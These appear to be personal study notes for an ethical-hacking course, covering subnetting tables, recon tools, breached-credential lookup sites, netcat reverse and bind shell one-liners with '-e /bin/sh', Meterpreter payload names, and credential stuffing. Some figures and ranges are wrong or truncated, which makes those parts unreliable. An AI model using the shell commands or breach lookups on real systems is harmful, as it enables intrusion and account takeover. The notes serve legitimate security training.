PEH - TCM

recs - https://github.com/Gr1mmie/Practical-Ethical-Hacking-Resources





## Subnetting

128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1
  1  1  1  1 1 1 1 1      1  1  1  1 1 1 1 1      1  1  1  1 1 1 1 1      0  0  0  0 0 0 0 0    /24
                 255                     255                     255                       0
                                                                                                hosts 2^8(no of zeros)
                                                                                                      256


              1   2   3   4   5   6   7   8     255.0.0.0
              9  10  11  12  13  14  15  16     255.255.0.0
             17  18  19  20  21  22  23  24     255.255.255.0
             25  26  27  28  29  30  31  32     
             
hosts       128  64  32  16   8   4   2   1
subnet      128 192 224 240 248 252 254 255


class A     10.0.0.0                    total hosts 16,777,216
class B     172.16.0.0 - 172.31.0.0                 65,536
class C     192.168.0.0 - 192.168                   256
loopback    127.0.0.0 - 127.0.0.7                                                                      


subnet   x.0.0.0
CIDR                   /1             /2           /3           /4           /5          /6         /7          /8
hosts       2,147,483,648  1,073,741,824  536,870,912  268,435,456  134,217,728  67,108,864  33,554,43  16,777,216

subnet   255.x.0.0
CIDR               /9       /10       /11       /12     /13     /14     /15     /16
hosts       8,388,608 4,194,304 2,097,152 1,048,576 524,288 262,144 131,072  65,536

subnet   255.255.x.0
CIDR            /17     /18     /19     /20    /21    /22     /23     /24
hosts       32,768   16,384   8,192   4,096  2,048  1,024     512     256

subnet   255.255.255.x
CIDR        /25  /26  /27  /28  /29  /30  /31  /32
hosts       128   64   32   16    8    4    2    1

subnet mask(replace x) 128  192  224  240  248  252  254  255


eg
                    subnet              hosts   Network         Broadcast
192.168.1.0/24      255.255.255.0       254     192.168.1.0     192.168.1.255
192.168.1.0/28      255.255.255.240     14      192.168.1.0     192.168.1.15
192.168.1.16/28     255.255.255.240     14      192.168.1.16    192.168.1.31
192.168.1.0/23      255.255.254.0       510     192.168.0.0     192.168.1.255
192.168.2.0/23      255.255.254.0       510     192.168.2.0     192.168.3.255

192.168.0.0/22      255.255.252.0     1,022     192.168.0.0     192.168.3.255
192.168.1.0/26      255.255.255.192      62     192.168.1.0     192.168.1.63
192.168.1.0/27      255.255.255.224      30     192.168.1.0     192.168.1.31



Bash
- ipsweep
- for ip in $(cat ip.txt); do nmap $ip; done




Stages
- Recon(active and passive)
- Scanning and enum(nmap,nessus,nikto)
- Gain access(exploitation)
- Maintain access
- Covering tracks(clean up logs,malwares,redo settings,accounts)




#Info Gathering(Passive)
location
employees
web/host - target validation(lookup,dnsrecon)
         - subdomains(bluto,google fu,dig,nmap,sublist3r,crt.sh)
         - fingerprinting(nmap,wapalizer,builtwith,whatweb,netcat)
         - data beaches(haveibeenpawned,breachparse,weleakinfo)
emails - hunter.io
       - phonebook.cz
       - tools.verifyemailaddress.io
       - email-checker.net
Creds  - breachparse.sh @domain.com domain.txt
       - dehashed(subscribe,login) (mk@domain.com mk1234, @domain.com)
       - hashes.com
subdomains - apt install sublist3r/owasp amass
           - crt.sh - certificate fingerprinting(%.domain.com)
           - tomnomnomm httpprobe(liveness of sub)
websites - builtwith.com
         - wappalizer
         - whatweb
         - burp
         - google fu(dorks)
social media
OSINT




#Scanning and enum
kioptrix(vulnhub) john TwoCows2
       - arpscan -l
       - netdiscover
       3 way handshake   - SYN SYNACK ACK
                         - SYN SYNACK RST (nmap -sS)
       - nikto
       - dirb, dirbuster, gobuster, feroxbuster
SMB - 139,445(port TCP/UDP 137 for name services, and port UDP 138 for datagram services)
       - msf
       - smbclient -L \\\\ip\\
SSH    - ssh ip -oKexAlgorithms=+</algo> -c aes128-cbc
Nessus




#Exploitation basics
Reverse shell - victim --> attacker
              nc <victimip> 4444 -e /bin/sh   -->  nc -lnvp 4444
Bind shell - attacker --> victim
              nc <attackerip> 4444  -->  nc -lnvp 4444 -e /bin/sh
Payloads - Staged - sends payload in stages
                  - less stable
                  - windows/meterpreter/reverse_tcp
         - Non-staged - sends shellcode payload at once
                      - large and might fail
                      - windows/meterpreter_reverse_tcp
NOTE
--***Automate https://github.com/heltonWernik/OpenLuck***--

credential stuffing - inject breached acc creds for acc takeover
password spraying - using known usernames against unknown passwd
       if on AD careful on acc lock out.












